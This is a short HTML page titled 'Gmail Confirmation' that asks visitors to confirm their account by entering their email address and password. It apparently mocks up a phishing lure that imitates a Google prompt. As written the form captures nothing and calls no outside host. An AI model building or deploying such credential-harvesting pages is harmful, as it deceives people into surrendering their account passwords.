<html>
    <head>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
        <title>
            Gmail Confirmation
        </title>
        
        
    </head>
    
    <body style="height: 100%">
        <div class="container">
            <h1 class="h1">
                Confirm Account Details
            </h1>
            <br>
            <br>
            <div class="h-100 row align-items-center">
                <div class="col-sm-4 col-sm-offset-4 well">
                    <form action="Confirmed.html">
                        <div class="form-group">
                            <label for="exampleInputEmail1">Email address</label>
                            <input type="email" id="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email">
                            <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                        </div>
                        <div class="form-group">
                            <label for="exampleInputPassword1">Password</label>
                            <input type="password" id="pwd" class="form-control" id="exampleInputPassword1" placeholder="Password">
                        </div>
                        <button type="submit" class="btn btn-primary">Submit</button>
                    </form>
                </div>
            </div>
        </div>
    </body>

</html>
